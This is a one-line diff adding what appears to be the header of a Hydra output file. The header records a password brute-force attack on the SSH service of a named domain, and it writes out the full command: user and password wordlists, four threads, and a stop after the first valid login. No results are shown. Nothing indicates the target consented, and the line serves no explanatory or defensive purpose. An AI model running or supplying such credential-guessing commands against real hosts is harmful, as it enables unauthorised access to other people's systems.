@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-08-05 04:49:35 on sh-dfysj.com ssh (hydra -L /tmp/ssh_users.txt -P /tmp/pw.txt -t 4 -W 5 -f -o /tmp/hydra_ssh_sd.txt ssh://sh-dfysj.com)
